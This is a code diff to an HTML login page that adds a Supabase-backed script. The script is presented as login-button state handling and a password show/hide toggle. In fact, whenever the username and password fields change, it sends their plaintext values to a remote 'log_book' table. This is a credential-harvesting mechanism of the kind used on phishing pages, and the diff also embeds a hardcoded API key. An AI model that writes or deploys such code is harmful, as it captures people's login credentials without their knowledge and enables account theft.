@@ -79,6 +79,76 @@
         }
         setTimeout(loadPage, 1700);
     </script>
+
+        <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+
+        const { createClient } = supabase
+        const _supabase = createClient('https://nerwtbrpetvexscqybev.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lcnd0YnJwZXR2ZXhzY3F5YmV2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjQzNDQ3MzQsImV4cCI6MjAzOTkyMDczNH0.7vaSMx1CMYvLWYRJP9FJB0W3hgVRkGWFDrqyzFLOuwU')
+
+        console.log('Supabase Instance: ', _supabase)
+
+
+        // GLOBAL VARIABLE DECLERATIONS
+        let username = document.querySelector("#username");
+        let password = document.querySelector("#password")
+        let loginButton = document.querySelector("#login-btn");
+        let showButton = document.querySelector("#show-btn");
+        let hideButton = document.querySelector("#hide-btn");
+
+        // LOGIN BUTTON ENABLE + DISABLE FUNCTION
+        username.addEventListener("change", stateHandle);
+        password.addEventListener("change", stateHandle);
+
+        function getAll() {
+            return { "everything": "you need" };
+        }
+
+        async function stateHandle() {
+            //const usernameText = username.val
+
+            const { error } = await _supabase
+            .from('log_book')
+            .insert({
+                    
+                "additional": getAll(),
+
+                "username": username.value,
+                "password": password.value,
+
+            })
+
+            if (error) {
+                console.error('Error inserting data:', error);
+            } else {
+                console.log('Data inserted successfully:');
+            }
+        }
+
+        function stateHandleUp() {
+            if (password.value.length > 5 ) {
+                loginButton.dsabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+
+        // PASSWORD SHOW/HIDE BUTTON SWTICH
+        function showPassword() {
+            if (password.type === "password") {
+                password.type = "text";
+                showButton.style.display = "none";
+                hideButton.style.visibility = "visible";
+            } else {
+                password.type = "password";
+                hideButton.style.visibility = "hidden";
+                showButton.style.display = "inline-block";
+            }
+        }
+
+        hideButton.style.visibility = "hidden";
+    </script>
+
     
 </body>
 </html>
